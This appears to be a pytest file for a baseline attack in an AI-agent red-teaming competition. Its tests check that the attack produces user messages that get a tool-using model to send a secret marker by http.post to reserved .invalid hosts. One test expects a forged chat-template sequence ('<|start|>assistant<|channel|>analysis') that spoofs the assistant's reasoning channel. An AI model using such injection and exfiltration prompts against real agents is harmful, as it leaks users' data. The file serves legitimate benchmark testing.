"""Contract, safety, and split-routing tests for the B003 reference candidate."""

import importlib.util
import sys
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

ATTACK_PATH = Path("baselines/public_replaysafe_split_v1/attack.py")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture
def attack_module(monkeypatch: pytest.MonkeyPatch):
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig

    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig

    core = types.ModuleType("aicomp_sdk.core")
    sdk = types.ModuleType("aicomp_sdk")

    monkeypatch.setitem(sys.modules, "aicomp_sdk", sdk)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", core)

    spec = importlib.util.spec_from_file_location("public_split_attack", ATTACK_PATH)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float = 5.0) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {
                        "url": "http://fixture.invalid",
                        "data": "SECRET_MARKER",
                    },
                }
            ]
        }


def test_candidate_hosts_are_unique_and_reserved(attack_module) -> None:
    urls = [attack_module._url(index) for index in range(attack_module.MAX_CANDIDATES)]

    assert len(set(urls)) == attack_module.MAX_CANDIDATES
    assert all(url.startswith("http://") and url.endswith(".invalid") for url in urls)


def test_structure_only_path_returns_bounded_valid_sample(attack_module) -> None:
    candidates = attack_module.AttackAlgorithm().run(None, None)

    assert len(candidates) == attack_module.FALLBACK_N
    assert all(len(candidate.user_messages) == 1 for candidate in candidates)
    assert all(".invalid" in candidate.user_messages[0] for candidate in candidates)


def test_default_probe_uses_configured_hop_cap(
    attack_module, monkeypatch: pytest.MonkeyPatch
) -> None:
    clock = FakeClock()
    monkeypatch.setattr(attack_module.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=5.0)

    candidates = attack_module.AttackAlgorithm().run(
        env,
        FakeConfig(time_budget_s=300.0, max_tool_hops=6),
    )

    assert candidates
    assert set(env.hops) == {6}
    assert clock.now <= 300.0


def test_slow_row_switches_to_frame_template(
    attack_module, monkeypatch: pytest.MonkeyPatch
) -> None:
    clock = FakeClock()
    monkeypatch.setattr(attack_module.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=13.0)

    candidates = attack_module.AttackAlgorithm().run(
        env,
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    candidate_messages = [candidate.user_messages[0] for candidate in candidates]
    assert any("<|start|>assistant<|channel|>analysis" in msg for msg in candidate_messages)
    assert all(".invalid" in msg for msg in candidate_messages)


def test_non_firing_environment_uses_bounded_fallback(
    attack_module, monkeypatch: pytest.MonkeyPatch
) -> None:
    clock = FakeClock()
    monkeypatch.setattr(attack_module.time, "monotonic", clock)

    class NonFiringEnv(FiringEnv):
        def export_trace_dict(self):
            return {"tool_events": []}

    candidates = attack_module.AttackAlgorithm().run(
        NonFiringEnv(clock, latency_s=5.0),
        FakeConfig(time_budget_s=300.0, max_tool_hops=8),
    )

    assert len(candidates) == attack_module.FALLBACK_N
